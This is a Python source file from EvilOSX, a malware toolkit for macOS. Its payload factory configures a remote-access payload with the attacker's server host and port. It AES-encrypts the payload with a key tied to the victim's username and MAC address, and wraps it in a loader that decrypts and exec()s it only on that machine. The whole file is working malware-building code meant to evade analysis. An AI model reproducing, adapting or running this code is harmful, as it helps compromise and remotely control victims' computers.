#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""Builds encrypted payloads which can only be run on the specific client."""
__author__ = "Marten4n6"
__license__ = "GPLv3"

import os
import random
import string
import base64
import json
from textwrap import dedent


class PayloadFactory:
    def __init__(self, loader_factory):
        self._loader_factory = loader_factory

    @staticmethod
    def _random_string(size, numbers=False):
        """:return A randomly generated string of x characters."""
        random_string = ""

        for i in range(0, size):
            if not numbers:
                random_string += random.choice(string.ascii_letters)
            else:
                random_string += random.choice(string.ascii_letters + string.digits)
        return random_string

    def create_payload(self, payload_options, loader_options, client_key):
        configured_payload = ""

        # Configure payload (set variables)
        server_host = payload_options["host"]
        server_port = payload_options["port"]
        program_directory = payload_options["program_directory"]
        loader_name = payload_options["loader_name"]

        with open(os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir, "EvilOSX.py")), "r") as input_file:
            for line in input_file:
                if line.startswith("# Random Hash: "):
                    configured_payload += "# Random Hash: %s\n" % (
                        self._random_string(random.randint(10, 69), numbers=True)
                    )
                elif line.startswith("SERVER_HOST = "):
                    configured_payload += "SERVER_HOST = \"%s\"\n" % server_host
                elif line.startswith("SERVER_PORT = "):
                    configured_payload += "SERVER_PORT = %s\n" % server_port
                elif line.startswith("PROGRAM_DIRECTORY = "):
                    configured_payload += "PROGRAM_DIRECTORY = os.path.expanduser(\"%s\")\n" % program_directory
                elif line.startswith("LOADER_OPTIONS = "):
                    # We also want access to the program directory and loader name.
                    loader_options[loader_name]["program_directory"] = program_directory
                    loader_options[loader_name]["loader_name"] = loader_name

                    configured_payload += "LOADER_OPTIONS = json.loads('%s')\n" % (
                        json.dumps(loader_options[loader_name]),
                    )
                else:
                    configured_payload += line

        # AES-256 encrypt the configured payload with the client key
        encrypt_command = "echo '%s' | openssl aes-256-cbc -a -salt -k %s -md sha256" % (
            base64.b64encode(configured_payload), client_key
        )
        encrypted = "".join(os.popen(encrypt_command).readlines()).replace("\n", "")

        # Return the loader which the stager will run
        return self._create_loader(loader_name, loader_options, payload_options, dedent("""\
        #!/usr/bin/env python
        # -*- coding: utf-8 -*-
        import os
        import getpass
        import uuid


        def get_uid():
            return "".join(x.encode("hex") for x in (getpass.getuser() + "-" + str(uuid.getnode())))


        exec("".join(os.popen("echo '{0}' | openssl aes-256-cbc -A -d -a -k %s -md sha256 | base64 --decode" % get_uid()).readlines()))
        """.format(encrypted)))

    def _create_loader(self, loader_name, loader_options, payload_options, payload):
        """Wraps the payload in the specified loader."""
        return self._loader_factory.get_loaders()[loader_name].generate(
            loader_options[loader_name], payload_options, payload
        )
